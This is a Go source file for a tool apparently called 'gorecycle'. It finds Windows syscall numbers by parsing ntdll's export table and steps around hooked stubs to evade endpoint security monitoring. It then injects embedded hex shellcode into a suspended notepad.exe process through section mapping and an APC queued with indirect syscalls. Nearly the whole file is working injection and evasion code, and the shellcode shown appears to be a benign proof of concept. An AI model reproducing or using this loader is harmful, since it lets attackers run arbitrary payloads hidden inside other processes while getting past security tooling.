package main

import (
	"fmt"
	"unsafe"
	"strconv"
	"strings"
	"time"
	"github.com/carved4/go-wincall"
	"gorecycle/pkg/syscall"
	"gorecycle/pkg/types"
)

const (
	PAGE_EXECUTE_READWRITE = 0x40
	PAGE_READWRITE         = 0x04
	PAGE_EXECUTE_READ      = 0x20
	SECTION_ALL_ACCESS     = 0x10000000
	SEC_COMMIT             = 0x8000000
	PROCESS_ALL_ACCESS     = 0x001F0FFF
	THREAD_ALL_ACCESS      = 0x001F03FF
	CREATE_SUSPENDED       = 0x00000004
	SYS_STUB_SIZE = 32
	UP            = -32
	DOWN          = 32
)


func containsNtdll(moduleName string) bool {
	lowerName := ""
	for _, r := range moduleName {
		if r >= 'A' && r <= 'Z' {
			lowerName += string(r + 32)
		} else {
			lowerName += string(r)
		}
	}
	
	return strings.Contains(lowerName, "ntdll.dll")
}

func readUnicodeFromBuffer(buffer uintptr, length uint16) string {
	if buffer == 0 || length == 0 {
		return ""
	}
	
	maxLen := int(length / 2)
	if maxLen > 256 {
		maxLen = 256
	}
	
	nameBytes := (*[256]uint16)(unsafe.Pointer(buffer))[:maxLen:maxLen]
	name := ""
	for _, b := range nameBytes {
		if b == 0 {
			break
		}
		name += string(rune(b))
	}
	return name
}

func findNtdll() uintptr {
	peb := getCurrentProcessPEB()
	if peb == nil {
		fmt.Println("[-] failed to get peb")
		return 0
	}
	
	if peb.Ldr == nil {
		fmt.Println("[-] peb.ldr is null")
		return 0
	}

	ldr := peb.Ldr
	current := syscall.WalkLDR(uintptr(unsafe.Pointer(ldr)))
	head := uintptr(unsafe.Pointer(&ldr.InMemoryOrderModuleList))
	maxIterations := 100

	visited := make(map[uintptr]bool)
	for i := 0; i < maxIterations && current != 0 && current != head; i++ {
		if visited[current] {
			break
		}
		visited[current] = true
		
		moduleBase := syscall.ReadModuleBase(current)
		if moduleBase != 0 {
			length, buffer := syscall.ReadModuleName(current)
			if length > 0 && buffer != 0 {
				moduleName := readUnicodeFromBuffer(buffer, length)
				if containsNtdll(moduleName) {
					return moduleBase
				}
			}
		}
		
		current = syscall.GetNextModule(current)
		if current == 0 {
			break
		}
	}

	fmt.Println("[-] could not find ntdll.dll")
	return 0
}

func getCurrentProcessPEB() *types.PEB {
	pebAddr := syscall.GetPEB()
	if pebAddr == 0 {
		return nil
	}

	maxRetries := 5
	var peb *types.PEB

	for i := 0; i < maxRetries; i++ {
		peb = (*types.PEB)(unsafe.Pointer(pebAddr))

		if peb != nil && peb.Ldr != nil {
			return peb
		}

		time.Sleep(100 * time.Millisecond)
	}

	return peb
}

func getSyscall(apiName string, sys *types.Syscall) bool {
	ntdllBase := findNtdll()
	if ntdllBase == 0 {
		fmt.Println("[-] ntdll base is null")
		return false
	}

	dosHeader := (*types.ImageDosHeader)(unsafe.Pointer(ntdllBase))
	if dosHeader == nil {
		fmt.Println("[-] DOS header is null")
		return false
	}
	
	if dosHeader.Signature != 0x5A4D {
		fmt.Printf("[-] invalid DOS signature: 0x%x (expected 0x5A4D)\n", dosHeader.Signature)
		return false
	}
	
	if dosHeader.ElfanewOffset == 0 || dosHeader.ElfanewOffset > 0x1000 {
		fmt.Printf("[-] invalid e_lfanew offset: 0x%x\n", dosHeader.ElfanewOffset)
		return false
	}

	ntHeadersAddr := ntdllBase + uintptr(dosHeader.ElfanewOffset)
	if ntHeadersAddr == 0 {
		fmt.Println("[-] nt headers address is null")
		return false
	}
	
	ntHeaders := (*types.ImageNtHeaders)(unsafe.Pointer(ntHeadersAddr))
	if ntHeaders == nil {
		fmt.Println("[-] nt headers is null")
		return false
	}
	
	if ntHeaders.Signature != 0x00004550 { // "PE\0\0"
		fmt.Printf("[-] invalid PE signature: 0x%x\n", ntHeaders.Signature)
		return false
	}
	
	if len(ntHeaders.OptionalHeader.DataDirectory) == 0 {
		fmt.Println("[-] no data directories")
		return false
	}
	
	exportDirRva := ntHeaders.OptionalHeader.DataDirectory[0].VirtualAddress
	if exportDirRva == 0 {
		fmt.Println("[-] export directory RVA is 0")
		return false
	}
	
	exportDir := (*types.ImageExportDirectory)(unsafe.Pointer(ntdllBase + uintptr(exportDirRva)))
	if exportDir == nil {
		fmt.Println("[-] export directory is null")
		return false
	}

	if exportDir.AddressOfFunctions == 0 || exportDir.AddressOfNames == 0 || exportDir.AddressOfNameOrdinals == 0 {
		fmt.Println("[-] invalid export table addresses")
		return false
	}

	if exportDir.NumberOfNames == 0 || exportDir.NumberOfNames > 10000 {
		fmt.Printf("[-] invalid number of names: %d\n", exportDir.NumberOfNames)
		return false
	}

	addressOfFunctions := (*[65536]uint32)(unsafe.Pointer(ntdllBase + uintptr(exportDir.AddressOfFunctions)))
	addressOfNames := (*[65536]uint32)(unsafe.Pointer(ntdllBase + uintptr(exportDir.AddressOfNames)))
	addressOfNameOrdinals := (*[65536]uint16)(unsafe.Pointer(ntdllBase + uintptr(exportDir.AddressOfNameOrdinals)))

	var stub uintptr

	for i := uint32(0); i < exportDir.NumberOfNames; i++ {
		nameRva := addressOfNames[i]
		namePtr := (*[256]byte)(unsafe.Pointer(ntdllBase + uintptr(nameRva)))
		
		var name string
		for j := 0; j < 256; j++ {
			if namePtr[j] == 0 {
				break
			}
			name += string(namePtr[j])
		}

		if name == apiName {
			ordinal := addressOfNameOrdinals[i]
			funcRva := addressOfFunctions[ordinal]
			stub = ntdllBase + uintptr(funcRva)
			break
		}
	}

	if stub == 0 {
		fmt.Printf("[-] syscall stub for %s is null\n", apiName)
		return false
	}

	var syscallNr uint16
	var hooked bool

	stubBytes := (*[SYS_STUB_SIZE]byte)(unsafe.Pointer(stub))

	for i := 0; i < SYS_STUB_SIZE; i++ {
		if stubBytes[i] == 0xe9 {
			hooked = true
			break
		}
		if stubBytes[i] == 0xc3 {
			return false
		}

		if i+7 < SYS_STUB_SIZE &&
			stubBytes[i] == 0x4c && stubBytes[i+1] == 0x8b && stubBytes[i+2] == 0xd1 &&
			stubBytes[i+3] == 0xb8 && stubBytes[i+6] == 0x00 && stubBytes[i+7] == 0x00 {
			low := stubBytes[i+4]
			high := stubBytes[i+5]
			syscallNr = uint16(high)<<8 | uint16(low)
			break
		}
	}

	gateStub := stub

	if hooked {
		numFunctions := int(exportDir.NumberOfFunctions)
		found := false

		for offset := 1; offset <= numFunctions; offset++ {
			downAddr := stub + uintptr(offset*DOWN)
			upAddr := stub + uintptr(offset*UP)
			if downAddr >= ntdllBase && downAddr < ntdllBase+0x100000 {
				downBytes := (*[8]byte)(unsafe.Pointer(downAddr))
				if downBytes[0] == 0x4c && downBytes[1] == 0x8b && downBytes[2] == 0xd1 &&
					downBytes[3] == 0xb8 && downBytes[6] == 0x00 && downBytes[7] == 0x00 {
					high := downBytes[5]
					low := downBytes[4]
					syscallNr = uint16(high)<<8|uint16(low) - uint16(offset)
					gateStub = downAddr
					found = true
					break
				}
			}
			if upAddr >= ntdllBase && upAddr < ntdllBase+0x100000 {
				upBytes := (*[8]byte)(unsafe.Pointer(upAddr))
				if upBytes[0] == 0x4c && upBytes[1] == 0x8b && upBytes[2] == 0xd1 &&
					upBytes[3] == 0xb8 && upBytes[6] == 0x00 && upBytes[7] == 0x00 {
					high := upBytes[5]
					low := upBytes[4]
					syscallNr = uint16(high)<<8|uint16(low) + uint16(offset)
					gateStub = upAddr
					found = true
					break
				}
			}
		}
		if !found {
			fmt.Println("[-] unable to find clean syscall gate")
			return false
		}
	}

	gateBytes := (*[SYS_STUB_SIZE]byte)(unsafe.Pointer(gateStub))
	var gate uintptr

	for i := 0; i < SYS_STUB_SIZE-2; i++ {
		if gateBytes[i] == 0x0f && gateBytes[i+1] == 0x05 && gateBytes[i+2] == 0xc3 {
			gate = gateStub + uintptr(i)
			break
		}
	}

	if gate == 0 || syscallNr == 0 {
		fmt.Println("[-] gate is null or syscall number is 0")
		return false
	}

	sys.SyscallNr = syscallNr
	sys.RecycledGate = gate

	return true
}

func dumpAllSyscalls() {
	fmt.Println("[+] dumping all syscalls 0->947")
	
	ntdllBase := findNtdll()
	if ntdllBase == 0 {
		fmt.Println("[-] ntdll base is null")
		return
	}

	dosHeader := (*types.ImageDosHeader)(unsafe.Pointer(ntdllBase))
	if dosHeader == nil || dosHeader.Signature != 0x5A4D {
		fmt.Println("[-] invalid DOS header")
		return
	}

	ntHeaders := (*types.ImageNtHeaders)(unsafe.Pointer(ntdllBase + uintptr(dosHeader.ElfanewOffset)))
	if ntHeaders == nil || ntHeaders.Signature != 0x00004550 {
		fmt.Println("[-] invalid NT headers")
		return
	}

	exportDirRva := ntHeaders.OptionalHeader.DataDirectory[0].VirtualAddress
	if exportDirRva == 0 {
		fmt.Println("[-] no export directory")
		return
	}

	exportDir := (*types.ImageExportDirectory)(unsafe.Pointer(ntdllBase + uintptr(exportDirRva)))
	if exportDir == nil {
		fmt.Println("[-] export directory is null")
		return
	}

	addressOfFunctions := (*[65536]uint32)(unsafe.Pointer(ntdllBase + uintptr(exportDir.AddressOfFunctions)))
	addressOfNames := (*[65536]uint32)(unsafe.Pointer(ntdllBase + uintptr(exportDir.AddressOfNames)))
	addressOfNameOrdinals := (*[65536]uint16)(unsafe.Pointer(ntdllBase + uintptr(exportDir.AddressOfNameOrdinals)))

	syscallMap := make(map[uint16]string)
	for i := uint32(0); i < exportDir.NumberOfNames; i++ {
		nameRva := addressOfNames[i]
		namePtr := (*[256]byte)(unsafe.Pointer(ntdllBase + uintptr(nameRva)))
		
		var name string
		for j := 0; j < 256; j++ {
			if namePtr[j] == 0 {
				break
			}
			name += string(namePtr[j])
		}
		if !strings.HasPrefix(name, "Zw") {
			continue
		}

		ordinal := addressOfNameOrdinals[i]
		funcRva := addressOfFunctions[ordinal]
		stub := ntdllBase + uintptr(funcRva)
		stubBytes := (*[SYS_STUB_SIZE]byte)(unsafe.Pointer(stub))
		for k := 0; k < SYS_STUB_SIZE-7; k++ {
			if stubBytes[k] == 0x4c && stubBytes[k+1] == 0x8b && stubBytes[k+2] == 0xd1 &&
				stubBytes[k+3] == 0xb8 && stubBytes[k+6] == 0x00 && stubBytes[k+7] == 0x00 {
				low := stubBytes[k+4]
				high := stubBytes[k+5]
				syscallNr := uint16(high)<<8 | uint16(low)
				
				if syscallNr <= 947 {
					// actual stubs r in zw but print nt for display
					displayName := name
					if strings.HasPrefix(name, "Zw") {
						displayName = "Nt" + name[2:]
					}
					syscallMap[syscallNr] = displayName
				}
				break
			}
		}
	}

	fmt.Printf("SSN\tAddress\t\tName\n")
	fmt.Printf("---\t-------\t\t----\n")
	
	count := 0
	for ssn := uint16(0); ssn <= 947; ssn++ {
		if name, exists := syscallMap[ssn]; exists {
			// Get function address for this syscall
			for i := uint32(0); i < exportDir.NumberOfNames; i++ {
				nameRva := addressOfNames[i]
				namePtr := (*[256]byte)(unsafe.Pointer(ntdllBase + uintptr(nameRva)))
				
				var exportName string
				for j := 0; j < 256; j++ {
					if namePtr[j] == 0 {
						break
					}
					exportName += string(namePtr[j])
				}

				if exportName == name {
					ordinal := addressOfNameOrdinals[i]
					funcRva := addressOfFunctions[ordinal]
					funcAddr := ntdllBase + uintptr(funcRva)
					fmt.Printf("%d\t0x%x\t%s\n", ssn, funcAddr, name)
					count++
					break
				}
			}
		}
	}
	
	fmt.Printf("\n[+] found %d syscalls\n", count)
}

func getEmbeddedShellcode() []byte {
	hexString := "505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3"

	bytes := make([]byte, len(hexString)/2)
	for i := 0; i < len(hexString); i += 2 {
		b, _ := strconv.ParseUint(hexString[i:i+2], 16, 8)
		bytes[i/2] = byte(b)
	}
	return bytes
}
func main() {
	fmt.Println("[+] gorecycle")

	// Dump all syscalls first
	dumpAllSyscalls()
	fmt.Println()

	var ntCreateSection types.Syscall
	var ntMapViewOfSection types.Syscall
	var ntQueueApcThread types.Syscall
	var ntResumeThread types.Syscall

	if !getSyscall("NtCreateSection", &ntCreateSection) {
		fmt.Println("[-] failed to resolve ntcreate")
		return
	}
	fmt.Printf("[+] ntcreate resolved: 0x%x - 0x%x\n", ntCreateSection.SyscallNr, ntCreateSection.RecycledGate)

	if !getSyscall("NtMapViewOfSection", &ntMapViewOfSection) {
		return
	}
	fmt.Printf("[+] ntmap resolved: 0x%x - 0x%x\n", ntMapViewOfSection.SyscallNr, ntMapViewOfSection.RecycledGate)

	if !getSyscall("NtQueueApcThread", &ntQueueApcThread) {
		return
	}
	fmt.Printf("[+] ntqueue resolved: 0x%x - 0x%x\n", ntQueueApcThread.SyscallNr, ntQueueApcThread.RecycledGate)

	if !getSyscall("NtResumeThread", &ntResumeThread) {
		return
	}
	fmt.Printf("[+] ntresume resolved: 0x%x - 0x%x\n", ntResumeThread.SyscallNr, ntResumeThread.RecycledGate)

	var si types.StartupInfo
	var pi types.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = 0x00000001
	si.ShowWindow = 0

	applicationName := "C:\\Windows\\notepad.exe\x00"
	
	result, err := wincall.Call("kernel32", "CreateProcessA",
		uintptr(unsafe.Pointer(unsafe.StringData(applicationName))),
		0,
		0,
		0,
		0,
		CREATE_SUSPENDED,
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)

	if result == 0 || err != nil {
		fmt.Printf("[-] failed to create suspended process: %v\n", err)
		return
	}
	fmt.Println("[+] created suspended process")

	var sectionHandle uintptr
	sectionSize := uintptr(len(getEmbeddedShellcode()))

	result, _ = syscall.IndirectSyscall(
		ntCreateSection.SyscallNr,
		ntCreateSection.RecycledGate,
		uintptr(unsafe.Pointer(&sectionHandle)),
		SECTION_ALL_ACCESS,
		0,
		uintptr(unsafe.Pointer(&sectionSize)),
		PAGE_EXECUTE_READWRITE,
		SEC_COMMIT,
		0,
	)

	if result != 0 {
		fmt.Printf("[-] ntcreate failed: 0x%x\n", result)
		wincall.Call("kernel32", "CloseHandle", pi.Process)
		wincall.Call("kernel32", "CloseHandle", pi.Thread)
		return
	}
	fmt.Println("[+] ntcreate success")

	var localView uintptr
	viewSize := sectionSize

	result, _ = syscall.IndirectSyscall(
		ntMapViewOfSection.SyscallNr,
		ntMapViewOfSection.RecycledGate,
		sectionHandle,
		uintptr(0xffffffffffffffff),
		uintptr(unsafe.Pointer(&localView)),
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&viewSize)),
		2,
		0,
		PAGE_READWRITE,
	)

	if result != 0 {
		fmt.Printf("[-] ntmap local failed: 0x%x\n", result)
		wincall.Call("kernel32", "CloseHandle", pi.Process)
		wincall.Call("kernel32", "CloseHandle", pi.Thread)
		wincall.Call("kernel32", "CloseHandle", sectionHandle)
		return
	}
	fmt.Println("[+] ntmap local success")

	var remoteView uintptr

	result, _ = syscall.IndirectSyscall(
		ntMapViewOfSection.SyscallNr,
		ntMapViewOfSection.RecycledGate,
		sectionHandle,
		uintptr(pi.Process),
		uintptr(unsafe.Pointer(&remoteView)),
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&sectionSize)),
		2,
		0,
		PAGE_EXECUTE_READ,
	)

	if result != 0 {
		fmt.Printf("[-] ntmap failed: 0x%x\n", result)
		wincall.Call("kernel32", "CloseHandle", pi.Process)
		wincall.Call("kernel32", "CloseHandle", pi.Thread)
		wincall.Call("kernel32", "CloseHandle", sectionHandle)
		return
	}
	fmt.Println("[+] ntmap success")

	localSlice := (*[1024]byte)(unsafe.Pointer(localView))[:len(getEmbeddedShellcode())]
	copy(localSlice, getEmbeddedShellcode())

	result, _ = syscall.IndirectSyscall(
		ntQueueApcThread.SyscallNr,
		ntQueueApcThread.RecycledGate,
		uintptr(pi.Thread),
		remoteView,
		remoteView,
		0,
		0,
	)

	if result != 0 {
		fmt.Printf("[-] ntqueue failed: 0x%x\n", result)
		wincall.Call("kernel32", "CloseHandle", pi.Process)
		wincall.Call("kernel32", "CloseHandle", pi.Thread)
		wincall.Call("kernel32", "CloseHandle", sectionHandle)
		return
	}
	fmt.Println("[+] ntqueue success")

	result, _ = syscall.IndirectSyscall(
		ntResumeThread.SyscallNr,
		ntResumeThread.RecycledGate,
		uintptr(pi.Thread),
		0,
	)

	fmt.Println("[+] ntresume success")

	wincall.Call("kernel32", "CloseHandle", pi.Process)
	wincall.Call("kernel32", "CloseHandle", pi.Thread)
	wincall.Call("kernel32", "CloseHandle", sectionHandle)

	fmt.Println("[+] shellcode injected and executed via recycled syscalls")
}
